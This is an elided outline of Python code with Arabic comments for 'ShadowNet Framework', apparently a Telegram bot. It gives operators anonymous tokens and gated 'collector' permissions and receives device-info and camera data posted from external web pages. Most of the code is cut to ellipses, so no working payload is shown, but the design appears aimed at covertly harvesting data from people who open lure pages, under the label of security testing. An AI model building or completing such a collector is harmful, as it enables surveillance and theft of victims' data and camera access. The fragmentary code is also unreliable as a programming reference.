...
"""
ShadowNet Framework v6.4 - النظام المتكامل للاختبارات الأمنية
مع نظام رموز آمن للمستخدمين لجمع البيانات بدون كشف هويتهم
...
def init_db():
    ...
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        ...
        referred_by INTEGER,
        created_at TEXT,
        can_use_collector INTEGER DEFAULT 0   -- صلاحية استخدام أدوات التجميع
    )''')
...
def generate_user_token(chat_id):
    """إنشاء رمز فريد للمستخدم وتخزينه في قاعدة البيانات"""
...
def get_user_token(chat_id):
    """استرجاع رمز المستخدم، وإنشاء واحد إذا لم يوجد"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
...
def build_main_menu(chat_id):
    ...
    # أزرار التجميع (تظهر فقط للمستخدمين المصرح لهم)
...
def callback_handler(call):
    ...
    # ===== الأزرار الجديدة: معلومات الجهاز والكاميرا (مع الرمز) =====
    if data == "device_info":
        ...
        if text.lower() == 'list':
            ...
            try:
                ...
                if row:
                    ...
                    # إنشاء رمز للمستخدم إذا لم يوجد
                    if new_status:
...
def collect_data():
    """
    استقبال البيانات من الصفحات الخارجية (mm.html, c.html)
    يتوقع JSON: { "token": "...", "data": { ... } }
    """
    try:
        data = request.get_json()
        if not data:
